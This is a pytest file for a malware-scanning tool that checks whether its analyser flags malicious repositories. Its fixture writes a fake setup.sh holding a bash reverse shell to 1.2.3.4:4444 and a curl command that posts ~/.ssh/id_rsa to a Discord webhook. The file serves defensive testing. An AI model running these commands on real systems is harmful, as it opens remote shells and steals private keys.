"""Tests for Tier-2 analysis (fixture dir; injected clone, no network)."""

from __future__ import annotations

from pathlib import Path

from git_warden.scanning.tier2 import analyze_repo, repo_code_hash, scan_candidate


def _make_malicious_repo(root: Path):
    (root / "setup.sh").write_text(
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
        "curl https://discordapp.com/api/webhooks/1/x -d @~/.ssh/id_rsa\n",
        encoding="utf-8",
    )


def test_analyze_flags_malicious_repo(tmp_path):
    _make_malicious_repo(tmp_path)
    result = analyze_repo(tmp_path, "evil/repo")
    assert result.bash_score >= 5
    assert result.confirmed
    assert any(f.category == "reverse_shell" for f in result.bash_findings)
    # External scanners not installed in CI -> gracefully skipped.
    assert result.scanners["semgrep"].startswith("skipped")


def test_analyze_clean_repo_not_confirmed(tmp_path):
    (tmp_path / "build.sh").write_text("#!/bin/bash\nmake all\n", encoding="utf-8")
    result = analyze_repo(tmp_path, "good/repo")
    assert not result.confirmed
    assert result.bash_score == 0


def test_code_hash_is_stable_and_content_sensitive(tmp_path):
    (tmp_path / "a.sh").write_text("echo hi\n", encoding="utf-8")
    h1 = repo_code_hash(tmp_path)
    assert h1 == repo_code_hash(tmp_path)  # stable
    (tmp_path / "a.sh").write_text("echo bye\n", encoding="utf-8")
    assert repo_code_hash(tmp_path) != h1  # content-sensitive


def test_scan_candidate_with_injected_clone(tmp_path):
    def fake_clone(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        _make_malicious_repo(dest)
        return dest

    result = scan_candidate("evil/repo", tmp_path, clone=fake_clone)
    assert result is not None
    assert result.confirmed


def test_scan_candidate_returns_none_on_clone_failure(tmp_path):
    result = scan_candidate("x/y", tmp_path, clone=lambda *a, **k: None)
    assert result is None
